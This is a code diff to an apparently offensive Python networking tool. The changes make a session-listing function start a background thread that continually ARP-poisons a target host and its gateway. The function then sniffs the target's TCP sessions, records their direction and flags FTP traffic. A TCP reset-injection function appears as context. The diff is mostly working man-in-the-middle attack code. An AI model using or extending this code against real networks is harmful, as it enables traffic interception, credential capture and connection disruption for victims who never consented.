@@ -178,10 +178,18 @@ def rst_inject(dev, source_mac, source, target, port = None):
 		sock.close()
 		set_ip_forward(0)
 
-def get_sessions(dev, target, port = 0):
+def get_sessions(dev, target, port = None):
+	source = get_default_gateway_linux()
 	filter = 'ip host %s' % target
+	if port:
+		filter += ' and port %s' % port
 	pc = pcap.pcap(dev)
 	pc.setfilter(filter) # we need only target packets
+	# need to create a daemon that continually poison our target
+	thread = Thread(target = poison, args = (dev, parse_mac(get_mac_addr(dev)), source, target,))
+	thread.daemon = True
+	thread.start()
+	print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W  + ' and ' + R + target + W
 	sessions = []
 	session = 0
 	sess = ""
@@ -192,7 +200,11 @@ def get_sessions(dev, target, port = 0):
 			if ip.p == dpkt.ip.IP_PROTO_TCP:
 				tcp = ip.data
 				if tcp.flags != dpkt.tcp.TH_RST:
-					sess = inet_ntoa(ip.src) + " : " + str(tcp.sport) + "\t-->\t" + inet_ntoa(ip.dst) + " : " + str(tcp.dport)
+					if inet_ntoa(ip.src) == target:
+						sess = inet_ntoa(ip.src) + ":" + str(tcp.sport) + "\t-->\t" + inet_ntoa(ip.dst) + ":" + str(tcp.dport)
+					else:
+						sess = inet_ntoa(ip.dst) + ":" + str(tcp.dport) + "\t<--\t" + inet_ntoa(ip.src) + ":" + str(tcp.sport)
+
 					if sess not in sessions:
 						sessions.append(sess)
 						if tcp.sport == 21 or tcp.dport == 21:
